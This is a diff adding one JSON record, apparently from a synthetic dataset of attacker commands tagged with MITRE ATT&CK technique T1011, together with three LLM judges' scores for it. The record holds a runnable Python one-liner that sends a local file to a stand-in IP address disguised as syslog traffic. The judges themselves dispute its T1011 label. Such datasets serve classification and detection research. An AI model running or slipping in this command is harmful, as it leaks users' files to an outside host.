@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1011",
+  "platform": "macOS",
+  "shell": "Python",
+  "command": "python3 -c 'import socket,datetime; s=socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect((\"198.51.100.23\", 49201)); prefix=(\"<34>1 \"+datetime.datetime.utcnow().isoformat()+\"Z macos app - - - \").encode(); s.sendall(prefix+open(\"/Users/Shared/.slog\",\"rb\").read()); s.close()'",
+  "explanation": "Exfiltrates data disguised as syslog-like messages over a non-standard TCP port, using a logging-style medium distinct from a primary C2 path, aligning with T1011.",
+  "rationale_steps": [
+    "Create a TCP socket to an uncommon port (49201) on a documentation IP.",
+    "Prefix content with a syslog-like header to mimic a different network medium.",
+    "Send file bytes as payload over the alternate logging channel.",
+    "No obfuscation employed; user-space only."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-PYTHON-T1011-e8d4b4c2-36b5070d",
+  "source_prompt_hash": "e8d4b4c2",
+  "timestamp_utc": "2025-09-30T08:45:56.629990Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Valid Python one-liner with balanced quoting/parentheses and correct use of socket and file operations.",
+        "semantic_score": 2,
+        "semantic_justification": "It exfiltrates a file over TCP with a syslog-like header, but this is not a different network medium (e.g., cellular/Bluetooth) as required by T1011.",
+        "combined_score": 3.5,
+        "confidence": 1,
+        "timestamp": "2025-10-01T01:23:46.815092Z"
+      },
+      {
+        "model": "claude-sonnet-4-6",
+        "syntactic_score": 5,
+        "syntactic_justification": "The Python one-liner is perfectly well-formed with balanced parentheses, proper string concatenation, valid socket API calls, and correct semicolon separators throughout.",
+        "semantic_score": 3,
+        "semantic_justification": "While the command does exfiltrate data over a non-standard TCP port with syslog-style formatting to blend in, T1011 specifically refers to exfiltration over a *different network medium* (e.g., cellular, Bluetooth, Wi-Fi vs. wired), whereas this command simply uses a different port/protocol over the same network medium as a typical C2 channel, making it more aligned with T1048 (Exfiltration Over Alternative Protocol) than T1011.",
+        "combined_score": 4.0,
+        "confidence": 0.85,
+        "timestamp": "2026-02-18T22:09:11.992767Z"
+      },
+      {
+        "model": "gemini-3-flash-preview",
+        "syntactic_score": 5,
+        "syntactic_justification": "The Python code is perfectly formed, uses correct syntax for sockets and file handling, and handles string-to-byte encoding correctly.",
+        "semantic_score": 3,
+        "semantic_justification": "While the command successfully exfiltrates data, it does so via standard TCP/IP on the default interface, which better aligns with T1041 or T1048; it lacks the logic to force traffic over an alternative physical medium as required by T1011.",
+        "combined_score": 4.0,
+        "confidence": 1,
+        "timestamp": "2026-02-18T22:09:18.543707Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 2.667,
+    "llm_average_score": 3.833,
+    "llm_verdict": "uncertain",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
